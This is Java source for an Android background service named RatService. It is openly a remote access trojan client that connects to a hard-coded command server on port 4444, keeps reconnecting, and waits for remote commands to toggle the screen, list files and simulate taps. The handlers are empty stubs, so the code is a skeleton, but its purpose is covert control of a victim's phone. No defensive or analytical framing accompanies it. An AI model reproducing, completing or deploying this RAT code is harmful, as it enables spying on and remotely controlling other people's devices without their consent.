package com.ratspy.client;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Random;

public class RatService extends Service {

 private Socket socket;
 private InputStream input;
 private OutputStream output;
 private boolean isRunning = true;
 private String serverIP = "192.168.1.100"; // CHANGE THIS TO YOUR PC IP
 private int serverPort = 4444;

 @Override
 public void onCreate() {
 super.onCreate();
 connectToServer();
 }

 private void connectToServer() {
 new Thread(() -> {
 while (isRunning) {
 try {
 socket = new Socket(serverIP, serverPort);
 input = socket.getInputStream();
 output = socket.getOutputStream();
 Log.d("RatSpy", "Connected to Server");
 listenForCommands();
 } catch (IOException e) {
 e.printStackTrace();
 try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
 }
 }
 }).start();
 }

 private void listenForCommands() {
 byte[] buffer = new byte[1024];
 int bytesRead;

 while (isRunning) {
 try {
 bytesRead = input.read(buffer);
 if (bytesRead > 0) {
 String command = new String(buffer, 0, bytesRead).trim();
 executeCommand(command);
 }
 } catch (IOException e) {
 break;
 }
 }
 }

 private void executeCommand(String command) {
 // Example Commands from Admin Panel
 if (command.equals("SCREEN_ON")) {
 // Code to turn screen on
 } else if (command.equals("SCREEN_OFF")) {
 // Code to turn screen off
 } else if (command.equals("GET_FILES")) {
 // Send file list to server
 } else if (command.equals("CLICK")) {
 // Simulate tap
 }
 }

 @Override
 public void onDestroy() {
 isRunning = false;
 super.onDestroy();
 }

 @Override
 public IBinder onBind(Intent intent) {
 return null;
 }
}